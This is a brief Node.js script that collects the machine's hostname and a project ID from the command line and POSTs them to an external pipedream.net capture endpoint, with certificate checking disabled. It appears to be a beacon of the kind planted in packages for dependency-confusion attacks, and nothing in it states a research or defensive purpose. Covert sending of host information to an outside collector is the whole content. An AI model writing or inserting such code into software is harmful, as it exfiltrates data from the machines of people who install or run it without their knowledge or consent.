const https = require('https');
var os = require("os");
var hostname = os.hostname();

const data = new TextEncoder().encode(
  JSON.stringify({
    payload: hostname,
    project_id: process.argv[2]
  })
);

const options = {
  hostname: 'eo33kmsodf3dxtf.m.pipedream.net',
  port: 443,
  path: '/',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': data.length
  },
  rejectUnauthorized: false
}

const req = https.request(options, res => {});
req.write(data);
req.end();
